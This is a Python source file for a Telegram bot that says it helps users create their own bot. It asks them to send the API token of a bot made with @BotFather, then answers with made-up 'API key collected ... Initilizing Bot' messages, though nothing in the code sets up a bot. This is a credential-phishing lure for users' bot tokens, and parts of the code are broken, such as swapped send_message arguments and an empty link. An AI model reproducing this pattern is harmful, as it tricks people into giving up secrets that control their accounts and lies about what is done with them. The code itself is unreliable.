
from tokens import bnb
import logging
from telegram.update import Update
from telegram.replykeyboardmarkup import ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
from telegram.ext.messagehandler import MessageHandler
from telegram.ext.filters import Filters
from telegram import ParseMode
from urllib.parse import quote_plus
import telegram

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)

logger = logging.getLogger(__name__)
bot = telegram.Bot(bnb)


def start(update: Update, context: CallbackContext) -> None:
    kbd_layout = [['Allow', 'Deny']]

    reply_markup = ReplyKeyboardMarkup(kbd_layout)

    update.message.reply_text(
        'Welcome to beyond native bot. I am here to help you with creating you own bot!',
        reply_markup=reply_markup)


def help_command(update: Update, context: CallbackContext) -> None:
    """Displays info on how to use the bot."""
    update.message.reply_text("Use /start to test this bot.")


def prepareBot(update: Update, context: CallbackContext):

    text = str(update.message.text).lower()
    msg = "Fine! Thanks for granting permissions"

    if text == 'allow':
        msg = "Okay Follow the @BotFather instructions to create a newbot provide us the API key ! Don't Share with anyone else"
    if ':' in text:
        text = text.split(':')
        if len(text[0]) == 10:
            try:
                chat_id = bot.get_updates()[-1].update_id
                bot.send_message('API key collected ... ', chat_id)
                bot.send_message('Initilizing Bot ...', chat_id)
            except:
                link = f""
                linkhtml = '<a href="' + \
                    quote_plus(link) + '">' + link + '</a>'
                
                msg = f"API key collected ...\nInitilizing Bot ...\nFinishing Up...\nNow goto your bot and setup neccessary things your own"

    update.message.reply_text(msg, parse_mode=ParseMode.HTML)
    pass


def main() -> None:
    """Run the bot."""
    # Create the Updater and pass it your bot's token.
    updater = Updater(bnb)
    updater.dispatcher.add_handler(CommandHandler('start', start))
    updater.dispatcher.add_handler(MessageHandler(Filters.text, prepareBot))
    updater.dispatcher.add_handler(CommandHandler('help', help_command))
    # Start the Bot
    updater.start_polling()
    # Run the bot until the user presses Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT
    updater.idle()


if __name__ == '__main__':
    main()
